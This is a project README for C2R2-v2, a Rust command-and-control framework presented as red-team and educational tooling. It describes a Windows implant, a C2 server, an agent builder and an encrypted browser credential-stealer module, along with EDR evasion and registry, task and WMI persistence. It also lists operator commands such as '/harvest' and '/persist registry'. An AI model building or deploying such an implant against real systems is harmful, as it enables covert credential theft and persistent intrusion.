# C2R2-v2 Documentation

Welcome to the C2R2-v2 (Command & Control Rust Reloaded) documentation. This is a modular offensive security framework written in Rust, designed for authorized security testing and educational purposes.

## ⚠️ Legal Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING PURPOSES ONLY**

This tool is provided for security researchers, penetration testers, and educational purposes. Any unauthorized use of this software to compromise systems you do not own or have explicit permission to test is illegal and unethical.

The authors and contributors assume no liability for misuse or damages caused by this software. By using C2R2-v2, you agree to use it only on systems you own or have written authorization to test.

## 📚 Documentation Overview

This documentation is organized into the following sections:

### Getting Started
- **[Installation Guide](INSTALLATION.md)** - Build and setup instructions
- **[Quick Start](USAGE.md#quick-start)** - Get up and running quickly
- **[Usage Guide](USAGE.md)** - Command reference and examples

### Architecture & Design
- **[System Architecture](ARCHITECTURE.md)** - Overall system design and component interaction
- **[Modules Overview](MODULES.md)** - Detailed module documentation
- **[API Reference](API.md)** - Developer API documentation

### Development
- **[Development Guide](DEVELOPMENT.md)** - Contributing and extending C2R2-v2
- **[Contributing Guidelines](CONTRIBUTING.md)** - How to contribute to the project
- **[Security Considerations](SECURITY.md)** - Security best practices and threat model

### Reference
- **[Changelog](../CHANGELOG.md)** - Version history and changes
- **[License](../LICENSE)** - Project license information

## 🎯 What is C2R2-v2?

C2R2-v2 is a modular offensive security suite written in Rust, inspired by frameworks like Havoc C2 and Cobalt Strike. It provides:

- **Lightweight Agent** - Minimal footprint (~60KB) with beacon communication
- **Modular Architecture** - Load capabilities on-demand via encrypted modules
- **Cross-Platform Builder** - Build Windows agents from Linux/WSL
- **Advanced Evasion** - Syscalls, obfuscation, and anti-analysis techniques
- **Credential Harvesting** - Multi-browser credential stealing capabilities
- **Persistence Mechanisms** - Multiple persistence methods (Registry, Tasks, WMI)
- **File Operations** - Bidirectional file transfer with Base64 encoding

## 🏗️ Architecture Overview

C2R2-v2 consists of four main components:

```
┌─────────────────┐
│   C2 Server     │ ◄─── Operator Interface (TCP)
│   (c2r2-server) │
└────────┬────────┘
         │
         │ TCP Connection (Beacon)
         ▼
┌─────────────────┐
│     Agent       │ ◄─── Target System (Windows)
│   (agent.exe)   │
└────────┬────────┘
         │
         │ Dynamic Module Loading
         ▼
┌─────────────────┐
│  Stealer DLL    │ ◄─── Encrypted Module
│ (stealer.dll)   │
└─────────────────┘

┌─────────────────┐
│    Builder      │ ◄─── Agent Generation Tool
│   (builder)     │
└─────────────────┘
```

### Components

1. **Agent** (`agent/`) - Lightweight implant that runs on target systems
2. **C2 Server** (`c2r2-server/`) - Command and control server with multi-client support
3. **Builder** (`builder/`) - Tool to build and configure agents
4. **Stealer DLL** (`stealer-dll/`) - Modular credential harvesting capability

## 🚀 Quick Example

```bash
# 1. Build the stealer module
./build-stealer.sh

# 2. Encrypt the module
cd builder
cargo run --release -- encrypt-module

# 3. Build an agent
cargo run --release -- build-agent --name agent1 --server 192.168.1.10:4444

# 4. Start the C2 server
cd ../c2r2-server
cargo run --release

# 5. Deploy agent to target and interact
# In C2 console:
/list                          # List connected agents
/select 1                      # Select agent
/cmd whoami                    # Execute command
/harvest                       # Steal credentials
/persist registry              # Establish persistence
```

## 📖 Key Features

### Beacon Communication
- Configurable check-in intervals with jitter
- Exponential backoff on connection failures
- Reduces network signature and evades detection

### Command Obfuscation
- Automatic ArgFuscator-style command obfuscation
- Random case changes, caret insertion, quote wrapping
- Environment variable substitution

### Modular Design
- Base agent is lightweight (~60KB)
- Additional capabilities loaded as encrypted modules
- Module encryption with AES-256-GCM

### Multi-Target Support
- Handle multiple agents simultaneously
- Broadcast commands to all agents
- Individual agent selection and management

### Advanced Persistence
- Windows Registry modification
- Scheduled Task creation
- WMI Event Subscription
- Startup folder persistence

## 🔒 Security Features

- **Direct Syscalls** - Bypass userland hooks (EDR evasion)
- **String Obfuscation** - Compile-time string encryption with `obfstr`
- **Module Encryption** - AES-256-GCM encrypted capability modules
- **No Disk Writes** - Modules loaded directly into memory
- **Process Injection** - Memory injection techniques for stealth

## 📝 Development Status

C2R2-v2 is under active development. Current version: **2.0.0**

### Implemented
- ✅ Direct TCP beacon communication
- ✅ Multi-client server architecture
- ✅ Command execution with obfuscation
- ✅ File transfer (upload/download)
- ✅ Credential harvesting module
- ✅ Multiple persistence mechanisms
- ✅ Cross-compilation support
- ✅ Logging and diagnostics

### Planned
- [ ] Additional persistence methods
- [ ] Process injection capabilities
- [ ] Lateral movement modules
- [ ] Alternative C2 channels (HTTP/HTTPS, DNS)
- [ ] Web-based C2 interface
- [ ] Telegram bot interface

## 🤝 Contributing

We welcome contributions! Please read our [Contributing Guidelines](CONTRIBUTING.md) before submitting pull requests.

## 📄 License

This project is provided for educational purposes. See [LICENSE](../LICENSE) for details.

## 🙏 Acknowledgments

C2R2-v2 is inspired by:
- **Havoc C2** - Modern C2 framework design
- **Cobalt Strike** - Professional red team operations
- **Metasploit** - Modular architecture
- **Covenant** - .NET C2 framework

## 📧 Contact

For questions, issues, or security concerns, please use GitHub Issues or contact the maintainers.

---

**Remember: With great power comes great responsibility. Use this tool ethically and legally.**
